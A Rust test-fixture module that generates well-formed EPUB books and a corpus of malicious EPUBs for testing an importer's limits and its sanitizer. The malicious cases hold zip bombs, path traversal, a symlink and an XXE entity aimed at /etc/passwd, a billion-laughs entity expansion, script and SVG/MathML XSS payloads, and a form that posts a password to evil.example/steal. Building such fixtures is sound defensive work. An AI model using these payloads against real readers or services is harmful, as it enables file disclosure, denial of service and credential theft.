//! Programmatic EPUB fixtures: a few well-formed books and a malicious corpus that
//! attacks every input limit and execution boundary at least once (spec §10.2
//! T05/T07/T08). `generate_epub_fixtures` (ignored test) writes them to
//! `tests/fixtures/epub/{good,malicious}/`.

use std::io::{Cursor, Write};

use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, DateTime, ZipWriter};

use super::EpubLimits;
use crate::error::ErrorCode;

pub(crate) const PNG: &[u8] = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\0\x01\0\0\0\x01\x08\x06\0\0\0\x1f\x15\xc4\x89";
pub(crate) const WOFF: &[u8] = b"wOFF\0\x01\0\0\0\0\0\0\0\0\0\0";

enum EntryData {
    File { data: Vec<u8>, stored: bool },
    Symlink(String),
}

pub(crate) struct EpubBuilder {
    entries: Vec<(String, EntryData)>,
    patches: Vec<(Vec<u8>, Vec<u8>)>,
    declared_size_patch: Option<(String, u32)>,
}

impl EpubBuilder {
    pub(crate) fn empty() -> Self {
        EpubBuilder { entries: Vec::new(), patches: Vec::new(), declared_size_patch: None }
    }

    /// mimetype + container.xml pointing to OEBPS/content.opf.
    pub(crate) fn new() -> Self {
        Self::empty()
            .stored("mimetype", b"application/epub+zip")
            .file("META-INF/container.xml", container_xml("OEBPS/content.opf").as_bytes())
    }

    pub(crate) fn file(mut self, name: &str, data: &[u8]) -> Self {
        self.entries.push((name.to_string(), EntryData::File { data: data.to_vec(), stored: false }));
        self
    }

    pub(crate) fn stored(mut self, name: &str, data: &[u8]) -> Self {
        self.entries.push((name.to_string(), EntryData::File { data: data.to_vec(), stored: true }));
        self
    }

    pub(crate) fn symlink(mut self, name: &str, target: &str) -> Self {
        self.entries.push((name.to_string(), EntryData::Symlink(target.to_string())));
        self
    }

    /// Replace bytes after writing (same length) – used for names the zip writer
    /// refuses to produce.
    pub(crate) fn patch(mut self, from: &str, to: &[u8]) -> Self {
        assert_eq!(from.len(), to.len());
        self.patches.push((from.as_bytes().to_vec(), to.to_vec()));
        self
    }

    /// Lie about an entry's uncompressed size in both local and central headers.
    pub(crate) fn declare_size(mut self, name: &str, size: u32) -> Self {
        self.declared_size_patch = Some((name.to_string(), size));
        self
    }

    pub(crate) fn build(&self) -> Vec<u8> {
        let mut w = ZipWriter::new(Cursor::new(Vec::new()));
        for (name, data) in &self.entries {
            let base = SimpleFileOptions::default().last_modified_time(DateTime::default()).unix_permissions(0o644);
            match data {
                EntryData::File { data, stored } => {
                    let opts = base.compression_method(if *stored {
                        CompressionMethod::Stored
                    } else {
                        CompressionMethod::Deflated
                    });
                    w.start_file(name.as_str(), opts).expect("start_file");
                    w.write_all(data).expect("write");
                }
                EntryData::Symlink(target) => {
                    w.add_symlink(name.as_str(), target.as_str(), base).expect("symlink");
                }
            }
        }
        let mut bytes = w.finish().expect("finish").into_inner();
        for (from, to) in &self.patches {
            let mut i = 0;
            while i + from.len() <= bytes.len() {
                if bytes[i..i + from.len()] == from[..] {
                    bytes[i..i + from.len()].copy_from_slice(to);
                    i += from.len();
                } else {
                    i += 1;
                }
            }
        }
        if let Some((name, size)) = &self.declared_size_patch {
            patch_declared_size(&mut bytes, name.as_bytes(), *size);
        }
        bytes
    }
}

fn patch_declared_size(b: &mut [u8], name: &[u8], size: u32) {
    let rd16 = |b: &[u8], i: usize| u16::from_le_bytes([b[i], b[i + 1]]) as usize;
    let mut i = 0;
    while i + 46 <= b.len() {
        if b[i..i + 4] == [0x50, 0x4b, 0x03, 0x04] {
            let nlen = rd16(b, i + 26);
            if b.get(i + 30..i + 30 + nlen) == Some(name) {
                b[i + 22..i + 26].copy_from_slice(&size.to_le_bytes());
            }
        } else if b[i..i + 4] == [0x50, 0x4b, 0x01, 0x02] {
            let nlen = rd16(b, i + 28);
            if b.get(i + 46..i + 46 + nlen) == Some(name) {
                b[i + 24..i + 28].copy_from_slice(&size.to_le_bytes());
            }
        }
        i += 1;
    }
}

pub(crate) fn container_xml(opf: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles><rootfile full-path="{opf}" media-type="application/oebps-package+xml"/></rootfiles>
</container>"#
    )
}

/// (id, href, media-type, properties)
pub(crate) type ManifestItem<'a> = (&'a str, &'a str, &'a str, &'a str);

pub(crate) fn opf3(title: &str, items: &[ManifestItem<'_>], spine: &[&str], extra_meta: &str, spine_attrs: &str) -> String {
    let mut s = format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="bookid">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="bookid">urn:uuid:12345678-1234-1234-1234-123456789abc</dc:identifier>
    <dc:title>{title}</dc:title>
    <dc:language>en</dc:language>
    <meta property="dcterms:modified">2024-01-01T00:00:00Z</meta>
    {extra_meta}
  </metadata>
  <manifest>
"#
    );
    for (id, href, mt, props) in items {
        if props.is_empty() {
            s.push_str(&format!("    <item id=\"{id}\" href=\"{href}\" media-type=\"{mt}\"/>\n"));
        } else {
            s.push_str(&format!("    <item id=\"{id}\" href=\"{href}\" media-type=\"{mt}\" properties=\"{props}\"/>\n"));
        }
    }
    s.push_str(&format!("  </manifest>\n  <spine{spine_attrs}>\n"));
    for idref in spine {
        s.push_str(&format!("    <itemref idref=\"{idref}\"/>\n"));
    }
    s.push_str("  </spine>\n</package>\n");
    s
}

pub(crate) fn xhtml(title: &str, head_extra: &str, body: &str) -> String {
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops" xml:lang="en" lang="en">
<head>
  <meta charset="utf-8"/>
  <title>{title}</title>
  {head_extra}
</head>
<body>
{body}
</body>
</html>
"#
    )
}

/// One-chapter book whose chapter body / head and extra files are attacker controlled.
pub(crate) fn one_chapter(head_extra: &str, body: &str, extra: &[(&str, &[u8], &str)]) -> EpubBuilder {
    let mut items: Vec<ManifestItem<'_>> = vec![("c1", "text/c1.xhtml", "application/xhtml+xml", "")];
    let ids: Vec<String> = (0..extra.len()).map(|i| format!("x{i}")).collect();
    for (i, (name, _, mt)) in extra.iter().enumerate() {
        items.push((ids[i].as_str(), name, mt, ""));
    }
    let mut b = EpubBuilder::new()
        .file("OEBPS/content.opf", opf3("Evil", &items, &["c1"], "", "").as_bytes())
        .file("OEBPS/text/c1.xhtml", xhtml("Chapter", head_extra, body).as_bytes());
    for (name, data, _) in extra {
        b = b.file(&format!("OEBPS/{name}"), data);
    }
    b
}

// ---------------------------------------------------------------------------
// Good fixtures
// ---------------------------------------------------------------------------

pub(crate) const DUP_SENTENCE: &str = "The same sentence appears in more than one place.";

pub(crate) fn normal_epub3() -> Vec<u8> {
    let nav = xhtml(
        "Contents",
        "",
        r##"<nav epub:type="toc" id="toc"><h1>Contents</h1><ol>
  <li><a href="ch1.xhtml">Chapter One</a><ol><li><a href="ch1.xhtml#s2">Section &amp; Two</a></li></ol></li>
  <li><a href="ch2.xhtml">Chapter Two</a></li>
  <li><a href="../text2/ch3.xhtml#end">Chapter Three</a></li>
</ol></nav>"##,
    );
    let ch1 = xhtml(
        "Chapter One",
        r#"<link rel="stylesheet" type="text/css" href="../css/style.css"/>
  <style>p.note { color: #333; background: url(../img/pic.png) }</style>"#,
        &format!(
            r##"<section epub:type="chapter" id="ch1">
<h1 id="h1">Chapter <em>One</em></h1>
<p id="p1">First paragraph with <strong>bold</strong>, <em>emphasis</em>, <code>code()</code> and a <a href="ch2.xhtml#target">link</a>.<a epub:type="noteref" href="#fn1"><sup>1</sup></a></p>
<p>Line one<br/>line two with emoji 😀 and e&#x301; combining.</p>
<p>{DUP_SENTENCE}</p>
<h2 id="s2">Section Two</h2>
<ul><li>Item one</li><li>Item two<ul><li>Nested item</li></ul></li></ul>
<blockquote><p>Quoted paragraph one.</p><p>Quoted paragraph two.</p></blockquote>
<pre><code>fn main() {{
    println!("hi &lt;3");
}}</code></pre>
<figure><img src="../img/pic.png" alt="A picture"/><figcaption>Figure 1. A caption.</figcaption></figure>
<table><caption>Table caption</caption><thead><tr><th>H1</th><th>H2</th></tr></thead><tbody><tr><td>a</td><td>b <em>c</em></td></tr></tbody></table>
<p>Inline math <math xmlns="http://www.w3.org/1998/Math/MathML" alttext="x squared"><msup><mi>x</mi><mn>2</mn></msup></math> here.</p>
<math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>E</mi><mo>=</mo><mi>m</mi><msup><mi>c</mi><mn>2</mn></msup></math>
<p class="note">Visit <a href="https://example.com/page?q=1">example</a>.</p>
<aside epub:type="footnote" id="fn1"><p>The footnote text.</p></aside>
</section>"##
        ),
    );
    let ch2 = xhtml(
        "Chapter Two",
        r#"<link rel="stylesheet" type="text/css" href="../css/style.css"/>"#,
        &format!(
            r#"<h1>Chapter Two</h1>
<p>{DUP_SENTENCE}</p>
<p id="target">Target paragraph.</p>
<p>{DUP_SENTENCE}</p>
<div>Loose text in a div <span>with span</span>.<p>Then a paragraph.</p>Trailing loose text.</div>"#
        ),
    );
    let ch3 = xhtml("Chapter Three", "", r#"<h1>Three</h1><p id="end">The end.</p>"#);
    let css = r#"@font-face { font-family: Body; src: url(../fonts/body.woff) format("woff") }
body { font-family: Body, serif; margin: 0 5% }
h1 { background-image: url("../img/pic.png"); text-align: center }"#;
    let items: Vec<ManifestItem<'_>> = vec![
        ("nav", "text/nav.xhtml", "application/xhtml+xml", "nav"),
        ("ch1", "text/ch1.xhtml", "application/xhtml+xml", ""),
        ("ch2", "text/ch2.xhtml", "application/xhtml+xml", ""),
        ("ch3", "text2/ch3.xhtml", "application/xhtml+xml", ""),
        ("css", "css/style.css", "text/css", ""),
        ("pic", "img/pic.png", "image/png", ""),
        ("font", "fonts/body.woff", "font/woff", ""),
    ];
    EpubBuilder::new()
        .file("OEBPS/content.opf", opf3("A Normal Book", &items, &["ch1", "ch2", "ch3"], "", "").as_bytes())
        .file("OEBPS/text/nav.xhtml", nav.as_bytes())
        .file("OEBPS/text/ch1.xhtml", ch1.as_bytes())
        .file("OEBPS/text/ch2.xhtml", ch2.as_bytes())
        .file("OEBPS/text2/ch3.xhtml", ch3.as_bytes())
        .file("OEBPS/css/style.css", css.as_bytes())
        .file("OEBPS/img/pic.png", PNG)
        .file("OEBPS/fonts/body.woff", WOFF)
        .build()
}

pub(crate) fn epub2_ncx() -> Vec<u8> {
    let opf = r#"<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="2.0" unique-identifier="id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:opf="http://www.idpf.org/2007/opf">
    <dc:title>Old Book</dc:title><dc:language>fr</dc:language><dc:identifier id="id">x</dc:identifier>
  </metadata>
  <manifest>
    <item id="ncx" href="toc.ncx" media-type="application/x-dtbncx+xml"/>
    <item id="a" href="a%20b.html" media-type="application/xhtml+xml"/>
    <item id="b" href="b.html" media-type="application/xhtml+xml"/>
  </manifest>
  <spine toc="ncx"><itemref idref="a"/><itemref idref="b" linear="no"/></spine>
</package>"#;
    let ncx = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ncx PUBLIC "-//NISO//DTD ncx 2005-1//EN" "http://www.daisy.org/z3986/2005/ncx-2005-1.dtd">
<ncx xmlns="http://www.daisy.org/z3986/2005/ncx/" version="2005-1"><navMap>
  <navPoint id="n1" playOrder="1"><navLabel><text>Début</text></navLabel><content src="a%20b.html"/>
    <navPoint id="n2" playOrder="2"><navLabel><text>Sub</text></navLabel><content src="a%20b.html#s"/></navPoint>
  </navPoint>
  <navPoint id="n3" playOrder="3"><navLabel><text>Annexe</text></navLabel><content src="b.html"/></navPoint>
</navMap></ncx>"#;
    let a = r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>A</title></head>
<body><h1>Titre&nbsp;un</h1><p id="s">Un&nbsp;paragraphe &laquo;cit&eacute;&raquo;.</p><a id="anchor"/><p>Après l'ancre.</p></body></html>"#;
    let b = r#"<html xmlns="http://www.w3.org/1999/xhtml"><head><title>B</title></head><body><p>Annexe<p>Soup</body></html>"#;
    EpubBuilder::new()
        .file("OEBPS/content.opf", opf.as_bytes())
        .file("OEBPS/toc.ncx", ncx.as_bytes())
        .file("OEBPS/a b.html", a.as_bytes())
        .file("OEBPS/b.html", b.as_bytes())
        .build()
}

pub(crate) fn rtl_vertical_fixed() -> Vec<u8> {
    let items: Vec<ManifestItem<'_>> =
        vec![("c1", "c1.xhtml", "application/xhtml+xml", ""), ("css", "v.css", "text/css", "")];
    let opf = opf3(
        "縦書き",
        &items,
        &["c1"],
        r#"<meta property="rendition:layout">pre-paginated</meta>"#,
        r#" page-progression-direction="rtl""#,
    );
    let c1 = xhtml("一", r#"<link rel="stylesheet" href="v.css"/>"#, "<p>縦書きの段落です。</p><p dir=\"rtl\">שלום עולם</p>");
    EpubBuilder::new()
        .file("OEBPS/content.opf", opf.as_bytes())
        .file("OEBPS/c1.xhtml", c1.as_bytes())
        .file("OEBPS/v.css", b"html { writing-mode: vertical-rl; -epub-writing-mode: vertical-rl }")
        .build()
}

// ---------------------------------------------------------------------------
// Malicious corpus
// ---------------------------------------------------------------------------

pub(crate) enum Expect {
    /// Rejected with this code; `reason` is matched against `details.reason` when set.
    Reject(ErrorCode, Option<&'static str>),
    /// Rejected with any of these codes.
    RejectAny(&'static [ErrorCode]),
    /// Accepted; output must be clean and contain these restriction prefixes.
    Sanitized(&'static [&'static str]),
}

pub(crate) struct Case {
    pub name: &'static str,
    pub bytes: Vec<u8>,
    pub limits: EpubLimits,
    pub expect: Expect,
}

fn case(name: &'static str, bytes: Vec<u8>, expect: Expect) -> Case {
    Case { name, bytes, limits: EpubLimits::default(), expect }
}

fn minimal_with(extra_name: &str, extra: &[u8]) -> EpubBuilder {
    one_chapter("", "<p>hello</p>", &[]).file(extra_name, extra)
}

/// Deterministic incompressible bytes.
fn noise(n: usize, seed: u32) -> Vec<u8> {
    let mut x = seed.wrapping_mul(2_654_435_761).wrapping_add(1);
    (0..n)
        .map(|_| {
            x ^= x << 13;
            x ^= x >> 17;
            x ^= x << 5;
            (x >> 24) as u8
        })
        .collect()
}

pub(crate) fn malicious_cases() -> Vec<Case> {
    use ErrorCode::*;
    let mut v = Vec::new();

    // --- ZIP limits ---------------------------------------------------------
    v.push(case("zip_bomb_ratio", minimal_with("OEBPS/bomb.bin", &vec![0u8; 20 * 1024 * 1024]).build(),
        Expect::Reject(LimitExceeded, Some("compression_ratio"))));
    {
        let mut b = one_chapter("", "<p>x</p>", &[]);
        for i in 0..20_001 {
            b = b.stored(&format!("f/{i}"), b"");
        }
        v.push(case("too_many_entries", b.build(), Expect::Reject(LimitExceeded, Some("too_many_entries"))));
    }
    v.push(case("entry_too_large", minimal_with("OEBPS/huge.bin", &vec![0u8; 65 * 1024 * 1024]).build(),
        Expect::Reject(LimitExceeded, Some("entry_too_large"))));
    {
        let b = minimal_with("OEBPS/n1.bin", &noise(300_000, 1)).file("OEBPS/n2.bin", &noise(300_000, 2));
        let mut c = case("total_uncompressed_too_large", b.build(), Expect::Reject(LimitExceeded, Some("total_uncompressed_too_large")));
        c.limits.max_total_uncompressed = 512 * 1024;
        v.push(c);
    }
    {
        // Header claims 1000 bytes, the deflate stream inflates to 2 MiB.
        let items: Vec<ManifestItem<'_>> =
            vec![("c1", "text/c1.xhtml", "application/xhtml+xml", ""), ("big", "big.png", "image/png", "")];
        let mut data = PNG.to_vec();
        data.extend(vec![0u8; 2 * 1024 * 1024]);
        let b = EpubBuilder::new()
            .file("OEBPS/content.opf", opf3("Lie", &items, &["c1"], "", "").as_bytes())
            .file("OEBPS/text/c1.xhtml", xhtml("c", "", r#"<p><img src="../big.png" alt=""/></p>"#).as_bytes())
            .file("OEBPS/big.png", &data)
            .declare_size("OEBPS/big.png", 1000);
        v.push(case("lying_uncompressed_size", b.build(), Expect::RejectAny(&[UnsupportedFormat, LimitExceeded])));
    }
    {
        let mut c = case("file_too_large_limit", normal_epub3(), Expect::Reject(LimitExceeded, Some("file_too_large")));
        c.limits.max_file_bytes = 1024;
        v.push(c);
    }

    // --- path boundaries ------------------------------------------------------
    v.push(case("path_traversal", minimal_with("../evil.xhtml", b"x").build(), Expect::Reject(UnsupportedFormat, Some("path_traversal"))));
    v.push(case("absolute_path", minimal_with("/tmp/evil.xhtml", b"x").build(), Expect::Reject(UnsupportedFormat, Some("path_absolute"))));
    v.push(case("backslash_path", minimal_with("OEBPS\\..\\..\\evil.xhtml", b"x").build(), Expect::Reject(UnsupportedFormat, Some("path_backslash"))));
    v.push(case("percent_encoded_traversal", minimal_with("%2e%2e/%2e%2e/evil.xhtml", b"x").build(), Expect::Reject(UnsupportedFormat, Some("path_traversal"))));
    v.push(case("drive_prefix", minimal_with("C:/evil.xhtml", b"x").build(), Expect::Reject(UnsupportedFormat, Some("path_drive_prefix"))));
    v.push(case("nul_in_name", minimal_with("OEBPS/aaaaNULbbbb.xhtml", b"x").patch("aaaaNULbbbb", b"aaaa\0\0\0bbbb").build(),
        Expect::RejectAny(&[UnsupportedFormat])));
    v.push(case("symlink_entry", one_chapter("", "<p>x</p>", &[]).symlink("OEBPS/link.xhtml", "/etc/passwd").build(),
        Expect::Reject(UnsupportedFormat, Some("symlink_entry"))));
    v.push(case("duplicate_normalized_name", minimal_with("OEBPS/text/c1%2Exhtml", b"<p>shadow</p>").build(),
        Expect::Reject(UnsupportedFormat, Some("duplicate_entry"))));

    // --- XML / package ----------------------------------------------------------
    {
        let bomb = r#"<?xml version="1.0"?>
<!DOCTYPE package [
 <!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
 <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
 <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
 <!ENTITY d "&c;&c;&c;&c;&c;&c;&c;&c;&c;&c;">
]>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0"><metadata><dc:title xmlns:dc="http://purl.org/dc/elements/1.1/">&d;</dc:title></metadata><manifest/><spine/></package>"#;
        let b = EpubBuilder::new().file("OEBPS/content.opf", bomb.as_bytes());
        v.push(case("xml_entity_expansion_opf", b.build(), Expect::Reject(UnsupportedFormat, Some("xml_entity"))));
    }
    {
        let ch = r#"<?xml version="1.0"?><!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>x</title></head><body><p>&xxe;</p></body></html>"#;
        let items: Vec<ManifestItem<'_>> = vec![("c1", "c1.xhtml", "application/xhtml+xml", "")];
        let b = EpubBuilder::new()
            .file("OEBPS/content.opf", opf3("XXE", &items, &["c1"], "", "").as_bytes())
            .file("OEBPS/c1.xhtml", ch.as_bytes());
        v.push(case("xml_external_entity_xhtml", b.build(), Expect::Reject(UnsupportedFormat, Some("xml_entity"))));
    }
    {
        let container = r#"<?xml version="1.0"?><!DOCTYPE container SYSTEM "http://evil.example/c.dtd" [<!ENTITY x "y">]><container/>"#;
        let b = EpubBuilder::empty().stored("mimetype", b"application/epub+zip").file("META-INF/container.xml", container.as_bytes());
        v.push(case("xml_entity_container", b.build(), Expect::Reject(UnsupportedFormat, Some("xml_entity"))));
    }
    {
        let mut b = one_chapter("", "<p>x</p>", &[]);
        b.entries[0] = ("mimetype".into(), EntryData::File { data: b"application/zip".to_vec(), stored: true });
        v.push(case("wrong_mimetype", b.build(), Expect::Reject(UnsupportedFormat, Some("wrong_mimetype"))));
    }
    {
        let enc = r#"<encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container" xmlns:enc="http://www.w3.org/2001/04/xmlenc#">
<enc:EncryptedData><enc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#aes128-cbc"/>
<enc:CipherData><enc:CipherReference URI="OEBPS/text/c1.xhtml"/></enc:CipherData></enc:EncryptedData></encryption>"#;
        v.push(case("encrypted_content_drm", minimal_with("META-INF/encryption.xml", enc.as_bytes()).build(), Expect::Reject(DrmUnsupported, None)));
    }
    {
        let enc = r#"<encryption xmlns="urn:oasis:names:tc:opendocument:xmlns:container" xmlns:enc="http://www.w3.org/2001/04/xmlenc#">
<enc:EncryptedData><enc:EncryptionMethod Algorithm="http://www.idpf.org/2008/embedding"/>
<enc:CipherData><enc:CipherReference URI="OEBPS/f.woff"/></enc:CipherData></enc:EncryptedData></encryption>"#;
        let b = one_chapter(r#"<style>@font-face{font-family:F;src:url(../f.woff)}</style>"#, "<p>x</p>", &[("f.woff", WOFF, "font/woff")])
            .file("META-INF/encryption.xml", enc.as_bytes());
        v.push(case("obfuscated_font", b.build(), Expect::Sanitized(&["obfuscated_font_removed:OEBPS/f.woff"])));
    }
    {
        let items: Vec<ManifestItem<'_>> = vec![
            ("c1", "c1.xhtml", "application/xhtml+xml", ""),
            ("evil", "../../../../etc/passwd", "text/css", ""),
            ("remote", "https://evil.example/x.xhtml", "application/xhtml+xml", ""),
        ];
        let b = EpubBuilder::new()
            .file("OEBPS/content.opf", opf3("Esc", &items, &["c1", "remote", "ghost"], "", "").as_bytes())
            .file("OEBPS/c1.xhtml", xhtml("c", "", "<p>x</p>").as_bytes());
        v.push(case("manifest_href_escape", b.build(),
            Expect::Sanitized(&["manifest_href_outside_root", "remote_resource_removed", "spine_ref_missing"])));
    }

    // --- content: scripts / handlers / urls -----------------------------------
    v.push(case(
        "script_and_handlers",
        one_chapter(
            r#"<script src="https://evil.example/x.js"></script><script>alert(1)</script>"#,
            r#"<p onclick="alert(1)" onmouseover='x()'>Click <a href="javascript:alert(1)">js</a>
<a href="JaVaScRiPt&#x3A;alert(2)">enc</a> <a href="java&#9;script:alert(3)">tab</a> <a href=" vbscript:x">vb</a></p>
<img src="../missing.png" onerror="alert(4)" alt="m"/><div><script>document.write('x')</script>after</div>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(5)"><circle r="1"/></svg>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&["scripted_content_removed"]),
    ));
    v.push(case(
        "svg_script_foreign_object",
        one_chapter(
            "",
            r##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">
<script type="text/javascript">alert(1)</script>
<foreignObject><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://evil.example/"></iframe></foreignObject>
<use xlink:href="https://evil.example/sprite.svg#a"/><use href="#ok"/>
<image href="https://evil.example/p.png"/><image xlink:href="data:image/png;base64,AAAA"/>
<a xlink:href="javascript:alert(2)"><rect id="ok" width="5" height="5" fill="url(https://evil.example/f#x)"/></a>
<animate attributeName="href" to="javascript:alert(3)"/><set attributeName="onclick" to="alert(4)"/>
<rect fill="url(#grad)" style="fill:url(https://evil.example/x)"/></svg>
<p><img src="../evil.svg" alt="svg"/></p>"##,
            &[(
                "evil.svg",
                br##"<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" onload="alert(1)"><script>alert(2)</script><foreignObject><body xmlns="http://www.w3.org/1999/xhtml">x</body></foreignObject><image xlink:href="https://evil.example/t.png"/><circle r="4"/></svg>"##,
                "image/svg+xml",
            )],
        )
        .build(),
        Expect::Sanitized(&["scripted_content_removed", "svg_foreign_object_removed", "remote_resource_removed"]),
    ));
    v.push(case(
        "css_attacks",
        one_chapter(
            r#"<link rel="stylesheet" href="../evil.css"/><link rel="stylesheet" href="https://evil.example/remote.css"/>
<style>@import url(https://evil.example/i.css); body { position: fixed; top: 0; z-index: 2147483647 }</style>"#,
            r#"<p style="background:url(https://evil.example/t.gif); color: red; -moz-binding: url(x.xml#y)">Styled</p>
<div style="width: expression(alert(1)); behavior: url(x.htc)">E</div><style>@import "x.css"; p{color:blue}</style>"#,
            &[(
                "evil.css",
                br#"@import url("https://evil.example/a.css"); @import 'local.css';
@font-face { font-family: X; src: url(https://evil.example/f.woff) }
body { position: fixed; position: sticky; z-index: 99999; background: url(//evil.example/x.png); -moz-binding: url(http://evil/x) }
p { background-image: url("javascript:alert(1)"); width: expression(alert(1)) }
a { color: green }"#,
                "text/css",
            )],
        )
        .build(),
        Expect::Sanitized(&["remote_resource_removed"]),
    ));
    v.push(case(
        "remote_resources",
        one_chapter(
            "",
            r#"<p><img src="https://tracker.example/pixel.gif" alt="t"/><img src="//cdn.example/x.png"/></p>
<video src="https://evil.example/v.mp4" poster="https://evil.example/p.jpg"><source src="https://evil.example/v.webm"/></video>
<audio src="https://evil.example/a.mp3"></audio><picture><source srcset="https://evil.example/s.png"/><img src="https://evil.example/i.png"/></picture>
<p>Kept</p>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&["remote_resource_removed", "media_removed"]),
    ));
    v.push(case(
        "meta_refresh_base",
        one_chapter(
            r#"<meta http-equiv="refresh" content="0;url=https://evil.example/"/><base href="https://evil.example/"/>"#,
            r#"<p>body</p><meta http-equiv="refresh" content="1;url=https://evil.example/2"/>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&[]),
    ));
    v.push(case(
        "iframe_object_form",
        one_chapter(
            "",
            r#"<iframe src="https://evil.example/" srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
<object data="https://evil.example/x.swf"><param name="a" value="b"/></object><embed src="https://evil.example/e"/>
<form action="https://evil.example/steal" method="post"><p>Inside form</p><input name="p" type="password"/>
<button formaction="https://evil.example/b">Go</button><textarea>t</textarea><select><option>o</option></select></form>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&["embedded_content_removed", "forms_removed"]),
    ));
    v.push(case(
        "data_file_custom_schemes",
        one_chapter(
            "",
            r#"<p><img src="data:image/png;base64,iVBORw0KGgo=" alt="d"/><a href="file:///etc/passwd">f</a>
<a href="custom-app://open">c</a><a href="data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;">d</a><img src="file:///etc/passwd"/></p>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&[]),
    ));
    v.push(case(
        "content_href_traversal",
        one_chapter(
            "",
            r#"<p><img src="../../../../../etc/passwd"/><a href="..%2F..%2F..%2Fsecret.xhtml">s</a><img src="%2e%2e/%2e%2e/%2e%2e/x.png"/></p>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&[]),
    ));
    v.push(case(
        "mathml_attack",
        one_chapter(
            "",
            r#"<p><math xmlns="http://www.w3.org/1998/Math/MathML" href="javascript:alert(1)"><maction actiontype="statusline"><mtext>x</mtext><mtext>javascript:alert(1)</mtext></maction>
<semantics><mi>y</mi><annotation-xml encoding="text/html"><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></annotation-xml></semantics>
<mglyph src="https://evil.example/g.png"/><mi xlink:href="https://evil.example" xmlns:xlink="http://www.w3.org/1999/xlink">z</mi></math></p>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&["mathml_fallback"]),
    ));
    {
        let mut deep = String::new();
        for _ in 0..5000 {
            deep.push_str("<div>");
        }
        deep.push_str("deep text");
        for _ in 0..5000 {
            deep.push_str("</div>");
        }
        v.push(case("deep_nesting", one_chapter("", &deep, &[]).build(), Expect::Sanitized(&[])));
    }
    v.push(case(
        "tag_soup_not_wellformed",
        one_chapter(
            "",
            r#"<p>Unclosed <b>bold <i>both</b> italic?</p><p>a<p>b<table><tr><td>cell<script>alert(1)</script></table><img src=x onerror=alert(1)>"#,
            &[],
        )
        .build(),
        Expect::Sanitized(&["xhtml_not_wellformed"]),
    ));
    v
}

#[test]
#[ignore = "writes tests/fixtures/epub; run explicitly to regenerate"]
fn generate_epub_fixtures() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("../tests/fixtures/epub");
    std::fs::create_dir_all(root.join("good")).unwrap();
    std::fs::create_dir_all(root.join("malicious")).unwrap();
    std::fs::write(root.join("good/normal_epub3.epub"), normal_epub3()).unwrap();
    std::fs::write(root.join("good/epub2_ncx.epub"), epub2_ncx()).unwrap();
    std::fs::write(root.join("good/rtl_vertical_fixed.epub"), rtl_vertical_fixed()).unwrap();
    for c in malicious_cases() {
        std::fs::write(root.join(format!("malicious/{}.epub", c.name)), &c.bytes).unwrap();
    }
}
